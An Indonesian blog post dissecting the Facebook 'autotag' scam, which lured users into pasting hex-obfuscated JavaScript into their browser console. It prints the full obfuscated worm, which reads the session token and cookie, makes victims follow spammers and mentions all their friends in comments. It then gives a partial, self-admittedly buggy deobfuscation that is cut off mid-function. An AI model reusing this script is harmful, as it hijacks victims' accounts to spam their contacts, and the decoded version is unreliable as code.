---
title: Facebook Autotag
date: 2014-01-30 13:35:56 +0700
locale: id
thumb: facebook.jpg
category: [Tulisan, Facebook, Spam]
---
Belakangan ini mulai marak dengan kasus autotag di Facebook, dimana setiap orang akan secara otomatis mention/summon semua friendlist nya kedalam komentar.<!-- more --> Seperti yang saya alami beberapa waktu lalu, saya di-mention oleh beberapa teman ke beberapa post. Setelah saya coba check post tersebut ternyata hanya post bodoh yang nggak ada gunanya sama sekali, antara lain _Hack password teman_, _Melihat isi inbox dari akun FB temen_ bahkan ada juga yang pake modus _Memperoleh ribuan follower cewek-cewek seksi_. WTF!

Semua dikemas dalam bentuk tutorial. Dimana mereka mengarahkan untuk membuka sebuah link, dan  semuanya mengarahkan ke link yang berbeda tapi dengan isi yang sama yaitu sebuah script javascript yang di encode menggunakan hexadesimal (saya kurang tau encoder apa yang mereka gunakan). Setelah itu, script tersebut harus di-copas ke browser console. Setelah script tersebut dijalankan barulah mereka dapat melihat hasilnya. Dan hasilnya adalah script tersebut memanggil semua daftar teman yang ada untuk di-mention dalam komentar post tersebut.

Saya sempat penasaran, bagaimana sebenernya kerja dari script tersebut. Apa benar-benar bisa mendapatkan sesuai yang ditulis di judul nya atau bagaimana?. Tapi kecurigaan mulai muncul saat lihat kolom komentar nya yang mencapai ratusan ribu, padahal post tersebut baru keluar beberapa jam yang lalu. Ternyata keseluruhan komentar disitu hanyalah mention. Dan dilihat dari waktu komentarnya yang sama, dapat dipastikan bahwa setiap orang yang berkomentar dalam post tersebut adalah orang yang mencoba menggunakan script tersebut. Sangat tidak mungkin seseorang dapat menyebutkan semua friendlist nya dalam waktu yang bersamaan kan?

Dari situ saya mulai penasaran dan ingin ikut mencoba, tapi bukan mencoba untuk menggunakan melainkan mencoba untuk men-decode script tersebut. Berikut adalah script aslinya

```js
var _0xa959=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x6
7\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\
x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x
62\x73\x74\x72\x69\x6E\x67","","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x2F\x61\x6A\x61\x
78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x
68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61
\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74
\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75
\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F"
,"\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\
x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x
2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x7
3\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x43\x6F\
x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x63\x6C\x6F\x73\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x7
4\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73"
,"\x73\x65\x6E\x64","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74
","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x
73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x
73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x
6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x
3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x
69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69
\x6C\x64","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x34\x33\x36\x38\x36\x34\x33\x35\x38\x38","\x31\x3
0\x30\x30\x30\x37\x30\x37\x39\x37\x39\x36\x31\x32\x30","\x31\x30\x30\x30\x30\x31\x35\x30\x33\x36\x31
\x39\x34\x35\x35","\x31\x30\x30\x30\x30\x35\x36\x30\x32\x33\x35\x32\x32\x39\x32","\x32\x34\x33\x37\x
33\x37\x38\x31\x35\x37\x38\x31\x38\x33\x38","\x31\x33\x38\x37\x37\x31\x32\x32\x36\x38\x31\x34\x31\x3
4\x32\x30","\x32\x36\x32\x30\x39\x32\x37\x35\x30\x36\x31\x33\x30\x31\x31","\x31\x39\x31\x37\x35\x39\
x36\x32\x37\x36\x38\x37\x34\x34\x38","\x31\x39\x33\x30\x37\x32\x31\x38\x30\x38\x38\x39\x35\x32\x36",
"\x31\x39\x33\x30\x37\x32\x31\x35\x30\x38\x38\x39\x35\x32\x39","\x67\x65\x74\x54\x69\x6D\x65","\x2F\
x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\
x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x2
6\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5
F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x2
5\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x2
5\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74
\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61
\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72
\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65
\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32
\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73
\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25
\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43
\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25
\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65
\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25
\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25
\x32\x46\x4E\x61\x6E\x2E\x65\x72\x74\x74\x37\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72
\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25
\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\
x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\
x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x
32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5
F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79
\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D
\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30
\x38\x38\x38\x30","\x31\x30\x30\x30\x30\x36\x39\x35\x32\x31\x31\x39\x30\x34\x38","\x32\x37\x36\x36\x
31\x32\x30\x37\x35\x38\x32\x37\x37\x34\x35","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","
\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x
65\x54\x65\x78\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\
x64","\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65
\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\
x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x2
6\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\
x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\
x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\
x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\
x5F\x5F\x61\x3D\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x
2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x
5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x66\x74\x5F\x65\x6E\x74\x5
F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74
\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x
37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x6
5\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F
\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x
6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x
2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x
74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x
2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65
\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\
x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x
69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\
x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\
x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74
\x74\x73\x74\x61\x6D\x70\x3D","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\
x6D\x65\x6E\x74\x2E\x70\x68\x70"];var fb_dtsg=document[_0xa959[2]](_0xa959[1])[0][_0xa959[0]];var us
er_id=document[_0xa959[4]][_0xa959[3]](document[_0xa959[4]][_0xa959[3]](/c_user=(\d+)/)[1]);function
cereziAl(_0x8cc3x4){var _0x8cc3x5=_0x8cc3x4+_0xa959[5];if(document[_0xa959[4]][_0xa959[6]]>0){konum=
document[_0xa959[4]][_0xa959[7]](_0x8cc3x5);if(konum!=-1){konum+=_0x8cc3x5[_0xa959[6]];son=document[
_0xa959[4]][_0xa959[7]](_0xa959[8],konum);if(son==-1){son=document[_0xa959[4]][_0xa959[6]];} ;return
unescape(document[_0xa959[4]][_0xa959[9]](konum,son));} else {return _0xa959[10];} ;} ;} ;function
getRandomInt(_0x8cc3x7,_0x8cc3x8){return
Math[_0xa959[12]](Math[_0xa959[11]]()*(_0x8cc3x8-_0x8cc3x7+1))+_0x8cc3x7;} ;function
randomValue(_0x8cc3xa){return _0x8cc3xa[getRandomInt(0,_0x8cc3xa[_0xa959[6]]-1)];} ;var
fb_dtsg=document[_0xa959[2]](_0xa959[1])[0][_0xa959[0]];var user_id=document[_0xa959[4]][_0xa959[3]]
(document[_0xa959[4]][_0xa959[3]](/c_user=(\d+)/)[1]);function a(_0x8cc3xc){var _0x8cc3xd= new
XMLHttpRequest();var _0x8cc3xe=_0xa959[13];var _0x8cc3xf=_0xa959[14]+_0x8cc3xc+_0xa959[15]+fb_dtsg+_
0xa959[16]+user_id+_0xa959[17];_0x8cc3xd[_0xa959[19]](_0xa959[18],_0x8cc3xe,true);_0x8cc3xd[_0xa959[
22]](_0xa959[20],_0xa959[21]);_0x8cc3xd[_0xa959[22]](_0xa959[23],_0x8cc3xf[_0xa959[6]]);_0x8cc3xd[_0
xa959[22]](_0xa959[24],_0xa959[25]);_0x8cc3xd[_0xa959[26]]=function
(){if(_0x8cc3xd[_0xa959[27]]==4&&_0x8cc3xd[_0xa959[28]]==200){_0x8cc3xd[_0xa959[25]];} ;}
;_0x8cc3xd[_0xa959[29]](_0x8cc3xf);} ;function sublist(_0x8cc3x11){var a=document[_0xa959[31]](_0xa9
59[30]);a[_0xa959[32]]=_0xa959[33]+_0x8cc3x11+_0xa959[34];document[_0xa959[36]][_0xa959[35]](a);} ;a
(_0xa959[37]);a(_0xa959[38]);a(_0xa959[39]);a(_0xa959[40]);sublist(_0xa959[41]);sublist(_0xa959[42])
;sublist(_0xa959[43]);sublist(_0xa959[44]);sublist(_0xa959[45]);sublist(_0xa959[46]);var _0xb161=[_0
xa959[0],_0xa959[1],_0xa959[2],_0xa959[3],_0xa959[4],_0xa959[47],_0xa959[48],_0xa959[49],_0xa959[50]
,_0xa959[51],_0xa959[52],_0xa959[53],_0xa959[54],_0xa959[55],_0xa959[18],_0xa959[19],_0xa959[26],_0x
a959[27],_0xa959[28],_0xa959[25],_0xa959[29],_0xa959[56]];var
fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var
user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var
now=( new Date)[_0xb161[5]]();function Report(_0x8cc3x15){var _0x8cc3x16= new XMLHttpRequest();var
_0x8cc3x17=_0xb161[6];var _0x8cc3x18=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x8cc3x15+_0xb161[9]+_0x8cc3x15+
_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x8cc3x16[_0xb161[15]](_0xb161[
14],_0x8cc3x17,true);_0x8cc3x16[_0xb161[16]]=function
(){if(_0x8cc3x16[_0xb161[17]]==4&&_0x8cc3x16[_0xb161[18]]==200){_0x8cc3x16[_0xb161[19]];} ;}
;_0x8cc3x16[_0xb161[20]](_0x8cc3x18);} ;var _0xa22c=[_0xa959[0],_0xa959[1],_0xa959[2],_0xa959[3],_0x
a959[4],_0xa959[57],_0xa959[26],_0xa959[27],_0xa959[58],_0xa959[59],_0xa959[10],_0xa959[60],_0xa959[
61],_0xa959[8],_0xa959[6],_0xa959[62],_0xa959[63],_0xa959[64],_0xa959[65],_0xa959[66],_0xa959[67],_0
xa959[68],_0xa959[69],_0xa959[70],_0xa959[71],_0xa959[72],_0xa959[73],_0xa959[74],_0xa959[75],_0xa95
9[76],_0xa959[77],_0xa959[7],_0xa959[78],_0xa959[79],_0xa959[80],_0xa959[19],_0xa959[81],_0xa959[29]
,_0xa959[11],_0xa959[12],_0xa959[82],_0xa959[83],_0xa959[84],_0xa959[85],_0xa959[86],_0xa959[87],_0x
a959[88],_0xa959[89],_0xa959[90],_0xa959[91],_0xa959[92],_0xa959[93],_0xa959[94],_0xa959[95],_0xa959
[96],_0xa959[97],_0xa959[98],_0xa959[99],_0xa959[18],_0xa959[100],_0xa959[20],_0xa959[21],_0xa959[22
],_0xa959[28],_0xa959[25]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var
user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var
id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x8cc3x1e= new
XMLHttpRequest();_0x8cc3x1e[_0xa22c[6]]=function (){if(_0x8cc3x1e[_0xa22c[7]]==4){eval(_0xa22c[8]+_0
x8cc3x1e[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0
xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_
0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]
+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15
]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa2
2c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x8cc3x1f=_0xa22c[24];_0x8cc3x1f+=_0xa22c[25];_0x8cc
3x1f+=_0xa22c[26];_0x8cc3x1f+=_0xa22c[27];_0x8cc3x1f+=_0xa22c[28]+user_id;_0x8cc3x1f+=_0xa22c[29]+us
er_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x8cc3x1e[_0xa22c[35]](_0xa22c[33],_0x
a22c[34]+_0x8cc3x1f,true);} else {_0x8cc3x1e[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x8cc3x1f,true);}
;_0x8cc3x1e[_0xa22c[37]]();} ;function RandomArkadas(){var _0x8cc3x21=_0xa22c[10];for(i=0;i<9;i++){_
0x8cc3x21+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*ar
kadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_
0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])
][_0xa22c[21]]+_0xa22c[22];} ;return _0x8cc3x21;} ;function yorum_yap(id,_0x8cc3x23){var _0x8cc3x24=
new XMLHttpRequest();var _0x8cc3x1f=_0xa22c[10];_0x8cc3x1f+=_0xa22c[40]+id;_0x8cc3x1f+=_0xa22c[41]+e
ncodeURIComponent(_0x8cc3x23);_0x8cc3x1f+=_0xa22c[42];_0x8cc3x1f+=_0xa22c[43];_0x8cc3x1f+=_0xa22c[44
];_0x8cc3x1f+=_0xa22c[45];_0x8cc3x1f+=_0xa22c[46];_0x8cc3x1f+=_0xa22c[47]+id+_0xa22c[48];_0x8cc3x1f+
=_0xa22c[49];_0x8cc3x1f+=_0xa22c[50];_0x8cc3x1f+=_0xa22c[51];_0x8cc3x1f+=_0xa22c[52];_0x8cc3x1f+=_0x
a22c[29]+user_id;_0x8cc3x1f+=_0xa22c[53];_0x8cc3x1f+=_0xa22c[54];_0x8cc3x1f+=_0xa22c[55];_0x8cc3x1f+
=_0xa22c[56]+fb_dtsg;_0x8cc3x1f+=_0xa22c[57];_0x8cc3x24[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_
0x8cc3x24[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x8cc3x24[_0xa22c[6]]=function
(){if(_0x8cc3x24[_0xa22c[7]]==4&&_0x8cc3x24[_0xa22c[63]]==200){_0x8cc3x24[_0xa22c[64]];} ;}
;_0x8cc3x24[_0xa22c[37]](_0x8cc3x1f);} ;arkadaslari_al(id);
```

dan ini adalah script hasil decoding manual yang saya lakukan. Mungkin masih terdapat beberapa kesalahan, tapi setidaknya saya tau strukturnya

```js
// fb_dtsg: untuk mendapatkan nilai dari elemnt dengan nama tersebut
// user_id: untuk mendapatkan user_id anda (yang sedang login)
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

// funsi untuk mendapatkan nilai cookie dari browser anda
function cereziAl(argumen) {
  var args = argumen +=;

  if (document.cookie.length>0) {
    konum = document.cookie.indexOf(args);

    if (konum != -1) {
      konum += args.length;
      son = document.cookie.indexOf(;, konum);

      if (son == -1) {
        son = document.cookie.length;
      }

      return unescape(document.cookie.substring(konum,son));
    } else {
      return;
    }
  }
}

// fungsi untuk mendapatkan nilai random integer
function getRandomInt(int1, int2) {
  return Math.floor(Math.random()*(int2-int1+1))+int1;
}

// fungsi untuk mendapatkan salah satu huruf dari kata secara random.
// Misal argumennya adalah 'dicoba' outputnya bisa 'd' atau 'c' atau huruf lain dalam kata tersebut
function randomValue(val) {
  return val[getRandomInt(0,val.length-1)];
}

// fungsi agar setiap pengguna yang menggunakan script ini akan secara langsung mengikuti (follow) akun dari pemilik script
function a(profile_id) {
  var request = new XMLHttpRequest(),
      target_url = 'profile_id='+profile_id+'&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg='+fb_dtsg+'&lsd&__'+user_id+'&phstamp=';

  request.open('POST','/ajax/follow/follow_profile.php?__a=1',true);
  request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  request.setRequestHeader('Content-length', target_url.length);
  request.setRequestHeader('Connection', 'close');

  request.onreadystatechange = function () {
    if (request.readyState == 4 && request.status == 200) {
      request.close;
    }
  }

  request.send(target_url);
}

// fungsi agar setiap pengguna yang menggunakan script ini akan langsung berlangganan berita dari halaman si pemilik akun
function sublist(profile_id) {
  var a = document.createElement('script');

  a.innerHTML = new AsyncRequest()
    .setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe')
    .setData({ flid: profile_id })
    .send();

  document.body.appendChild(a);
}

// disinilah daftar profile yang akan anda ikuti (follow)
a('100004368643588'); // profile -> Ade Satria
a('100007079796120'); // profile -> Ade Satria
a('100001503619455'); // profile -> Desy Dcriforlove
a('100005602352292'); // profile -> Split Sevén Inch

sublist('243737815781838'); // Klik Ikuti Otomatis Status Kamu di Like ribuan like ᴀᴜᴛᴏ ғᴏʟʟᴏᴡᴇʀs ғᴀᴄᴇʙᴏᴏᴋ
sublist('1387712268141420'); // profile -> Facebook Community
sublist('262092750613011'); // profile -> ❶ ℱℴℓℓℴω ❶ ✔☛ »»»➜ ➜ ➜
sublist('191759627687448'); // profile -> (▓▓▓(̅(_̅_̅_̅_̅_̅_̅_̅_̅_̅_̅_̅_̅()
sublist('193072180889526'); // profile -> Klik Ikuti & Tekan Ctrl + W. Lihat apa yang terjadi. Di coba saja.
sublist('193072150889529'); // profile ->

var now = (new Date).cookie();

// saya masih belum tau ini buat apaan
function Report(_0x8cc3x15) {
  var request = new XMLHttpRequest(),
      target_url = '//www.facebook.com/ajax/report/social.php'+fb_dtsg+'fb_dtsg='+_0x8cc3x15+'&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A'+_0x8cc3x15+'%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNan.ertt7%22%2C%22report_type%22%3A145%2C%22rid%22%3A'+now+'%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A'+user_id+'%2C%22user%22%3A'+user_id+'%7D&file_report=1&__user=';

  request.POST('&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880', 'getTime', true);
  request.open = function () {
    if (request.onreadystatechange == 4 && request.readyState == 200) {
      request.status;
    }
  }

  request.close(target_url);
}

var id = '276612075827745', // post id
  arkadaslar = [],        // tempat nampun daftar teman
  svn_rev;                // tempat nampung daftar komentar (menyesuaikan dengan batas text dalam komentar)

// fungsi buat manggil semua daftar teman dalam komentar di post 'id' diatas (baris 99)
function arkadaslari_al(id) {
  var request = new XMLHttpRequest();

  request.onreadystatechange = function () {
    if (request.readyState == 4) {
      eval(arkadaslar = request.responseText.toString().replace(for (;;);,'')+';');

      for (f=0; f<Math.round(arkadaslar.payload.entries.length/27); f++) {
        mesaj = '';
        mesaj_text = '';

        for (i=f*27; i<(f+1)*27; i++) {
          if (arkadaslar.payload.entries[i]) {
            mesaj+= ' @['+arkadaslar.payload.entries[i]['uid']+':'+arkadaslar.payload.entries[i].text+']';
            mesaj_text+= ' '+arkadaslar.payload.entries[i].text;
          }
        }

        yorum_yap(id, mesaj);
      }
    }
  }

  var target_url = '&filter[0]=user&options[0]=friends_only&options[1]=nm&token=v7&viewer='+user_id+'&__user='+user_id;

  if (document.URL.indexOf('https://') >= 0) {
      request.open('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1'+target_url, true);
  } else {
      request.open('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1'+target_url, true);
  }

  request.send();
}

// belum tau ini fungsinya buat apaan, soalnya keliatannya fungsi ini nggak dipake
function RandomArkadas() {
  var target_id = '';

  for (i=0; i<9; i++) {
